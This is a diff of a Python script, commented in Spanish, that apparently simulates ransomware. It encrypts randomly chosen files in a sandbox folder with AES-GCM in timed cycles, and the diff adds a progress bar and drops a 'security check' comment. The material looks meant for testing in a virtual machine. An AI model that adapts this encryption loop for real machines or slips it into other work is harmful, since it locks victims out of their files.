@@ -1,9 +1,9 @@
-
 import os
 import time
 import random
 from pathlib import Path
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from tqdm import tqdm  # Para barra de progreso
 
 # CONFIGURACION (modificar SOLO dentro de la VM para pruebas)
 SANDBOX_DIR = Path(r"C:\ransom_sandbox")  # o "/home/user/ransom_sandbox"
@@ -49,17 +49,20 @@ def main():
         if not candidates:
             print("No quedan archivos para cifrar. Saliendo.")
             break
+
         # seleccionar una 'carpeta' al azar para simular comportamiento
         random.shuffle(candidates)
         to_encrypt = candidates[:FILES_PER_CYCLE]
+
         print(f"Cifrando {len(to_encrypt)} archivos...")
-        for p in to_encrypt:
+        # Barra de progreso visual para cifrado de los archivos del ciclo
+        for p in tqdm(to_encrypt, desc="Progreso cifrado", unit="archivo"):
             encrypt_file(Path(p))
+
         time.sleep(ENC_INTERVAL)
 
 
 if __name__ == "__main__":
-    # seguridad: comprobar que SANDBOX_DIR existe y parece ser sandbox
     if not SANDBOX_DIR.exists():
         print("SANDBOX_DIR no existe. Crea la carpeta de pruebas y vuelve a ejecutar.")
     else:
